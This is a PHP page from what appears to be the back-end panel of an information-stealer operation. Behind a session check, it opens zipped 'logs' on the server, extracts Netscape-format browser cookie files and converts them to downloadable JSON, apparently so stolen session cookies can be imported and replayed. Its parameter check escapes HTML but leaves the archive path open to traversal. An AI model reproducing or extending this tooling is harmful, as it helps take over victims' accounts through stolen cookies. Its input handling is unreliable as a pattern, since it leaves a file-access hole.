<?php
session_start();
error_reporting(0);

require("app/config.php");

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["server_addr"] .'/auth', true, 301 );
	exit(0);
}

$log = checkParam($_GET["log"]);
$file = checkParam($_GET["file"]);

if($log != null)
{
	$zip = new ZipArchive;
	$reading = "";
	
	if ($zip->open('server/'.$config["logs_folder"].'/'. $log .'') === TRUE) 
	{
		$reading = $zip->getFromName($file);
			
		//echo nl2br($reading);
		$converted_cookie = extractCookies($reading);
		$zip->close();
		
		header('Content-type: application/json');
		header('Content-Disposition: attachment; filename="'.$file.'.json"');
		header('Content-Length: ' . strlen($converted_cookie));
		echo $converted_cookie;
	} 
	else 
	{
		echo 'Error Reading File.';
	}
}
else
{
	header('Location: http://'. $_SERVER["HTTP_HOST"] .'/index');
	exit(0);
}

function extractCookies($string)
{
	$cookies = array();
	$lines = explode("\n", $string);
	foreach ($lines as $line)
	{
		if (isset($line[0]) && substr_count($line, "\t") == 6)
		{
			$tokens = explode("\t", $line);
			$tokens = array_map('trim', $tokens);
			$cookie = array();
			$cookie['domain'] = $tokens[0];
			$cookie['flag'] = $tokens[1];
			$cookie['path'] = $tokens[2];
			$cookie['secure'] = $tokens[3];
			$cookie['expiration'] = date('Y-m-d h:i:s', $tokens[4]);
			$cookie['name'] = $tokens[5];
			$cookie['value'] = $tokens[6];
			$cookies[] = $cookie;
		}
	}
	if ($cookies != null)
	{
		return json_encode($cookies);
	}
}

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}
?>